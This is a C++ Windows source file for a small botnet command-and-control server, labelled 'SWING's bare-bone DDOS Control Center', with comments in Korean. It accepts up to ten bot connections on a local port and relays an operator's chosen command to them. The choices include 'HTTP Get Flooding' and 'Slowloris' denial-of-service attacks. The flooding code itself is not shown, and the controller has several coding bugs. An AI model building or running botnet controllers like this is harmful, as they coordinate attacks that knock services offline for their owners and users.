#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <chrono>
#include <condition_variable>
#include <functional>
#include <utility>
#include <mutex>
#include <thread>
#include <queue>
#include <vector>
#include <iostream>
#include <WinSock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <cstdio>
#pragma comment(lib, "Ws2_32.lib")//윈도우 소켓 프로그래밍에 필요한 헤더 및 라이브러리

using namespace std;

#define BUFLEN 1024
#define IPADDR "127.0.0.1"
#define DEFAULT_PORT "1234"//포트 1234로 지정
#define MAX_BOTS 10   

namespace ThreadPool {

    class ThreadPool {
    public:
        ThreadPool(size_t num_threads);
        ~ThreadPool();

        // job 을 추가한다.
        void EnqueueJob(function<void()> job);

    private:
        // 총 Worker 쓰레드의 개수.
        size_t num_threads;
        // Worker 쓰레드를 보관하는 벡터.
        vector<thread> worker_threads;
        // 할일들을 보관하는 job 큐.
        queue<function<void()>> jobs;
        // 위의 job 큐를 위한 cv 와 m.
        mutex m;
        condition_variable cv;
        // 모든 쓰레드 종료
        bool stop_all;
        // Worker 쓰레드
        void WorkerThread();
    };


    //스레드풀 생성
    ThreadPool::ThreadPool(size_t nums) : num_threads(nums), stop_all(false) {
        worker_threads.reserve(num_threads);
        for (size_t i = 0; i < num_threads; ++i) {
            worker_threads.emplace_back([this]() {this->WorkerThread(); });
        }
    }

    void ThreadPool::WorkerThread() {      // task - thread assignment
        while (true) {
            unique_lock<mutex> lock(m);
            cv.wait(lock, [this]() {return !this->jobs.empty() || stop_all; });
            if (stop_all && this->jobs.empty()) return;

            // 맨 앞의 job 을 뺀다.
            function<void()> job = move(jobs.front());
            jobs.pop();
            lock.unlock();
            // 해당 job 을 수행한다 :)
            job();
        }
    }

    //스레드 소멸자
    ThreadPool::~ThreadPool() {
        stop_all = true;
        cv.notify_all();

        for (auto& t : worker_threads)
            t.join();
    }

    void ThreadPool::EnqueueJob(function<void()> job) {      
        if (stop_all) {
            throw std::runtime_error("ThreadPool 사용 중지됨");
        }
        unique_lock<mutex> lock(m);
        jobs.push(job);
        cv.notify_one();
    }
};

void work(SOCKET sock, char command[]) {      
    char recvbuf[BUFLEN];
    int buflen = BUFLEN;

    struct sockaddr_in addr;
    int addr_len;
    addr_len = sizeof(addr);

    SOCKET ClientSock = accept(sock, (struct sockaddr*) & addr, &addr_len);
    if (ClientSock == INVALID_SOCKET) {
        perror("accept fail");
        closesocket(ClientSock);
        return;
    }

    getpeername(ClientSock, (struct sockaddr*) & addr, &addr_len);
    cout << "bot accepted : " << inet_ntoa(addr.sin_addr) << "\n";
    //unique_lock<mutex> lock;

    if (send(ClientSock, command, buflen, 0) == SOCKET_ERROR) {
        perror("send fail");
        cout << WSAGetLastError << '\n';
        closesocket(ClientSock);
        return;
    }

    // lock.unlock();
    while (1) {
        memset(recvbuf, 0, buflen);
        if (recv(ClientSock, recvbuf, buflen, 0) > 0)
            cout << recvbuf << "\n";
        else {
            perror("return fail");
            return;
        }
        Sleep(1000);
    }

    closesocket(ClientSock);
}

void InitAndInput(char command[]) {      //명령을 받아줄 메시지

    cout << "SWING's bare-bone DDOS Control Center"<< endl;
    cout << "=============CHOOSE ONE==============="<<endl;
    cout << "ping"<<endl<<"attack"<<endl<<"shut"<<endl;
    cout << "======================================"<<endl;

    while (1) {
        cout << ">> ";
        cin.getline(command, 10);

        if (!strcmp(command, "ping")) break;
        if (!strcmp(command, "attack")) {
            cout << "CHOOSE YOUR WEAPON.\n";
            cout << "1. HTTP Get Flooding\n";
            cout << "2. Slowloris\n";
            cout << ">> ";
            cin.getline(command, 10);
            break;
        }
        if (!strcmp(command, "shut")) break;
        cout << "wrong command. try again\n";
    }
}

int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    // 사용할 윈솤 버전을 요청하며 윈솤 초기화 소켓을 생성할 준비

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in addr; //socket 생성

    if (sock == INVALID_SOCKET) {
        perror("socket error");
        system("pause");
        return -1;
    }//socket 에러시 종료

    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(DEFAULT_PORT));
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");//소켓을 만드는데 필요한 정보들

    if (::bind(sock, (struct sockaddr*) & addr, sizeof(addr)) == SOCKET_ERROR) {
        perror("bind error");
        return -1;
    }

    if (listen(sock, SOMAXCONN) == SOCKET_ERROR) {
        perror("listen error");
        return -1;
    }

    char command[BUFLEN];
    memset(command, 0, BUFLEN);

    InitAndInput(command);
    cout << command << " started . . . \n";

    ThreadPool::ThreadPool pool(MAX_BOTS);

    while (1) {
        pool.EnqueueJob([sock, command]() {work(sock, const_cast<char*> (command)); });
        Sleep(1000);
    }

} 
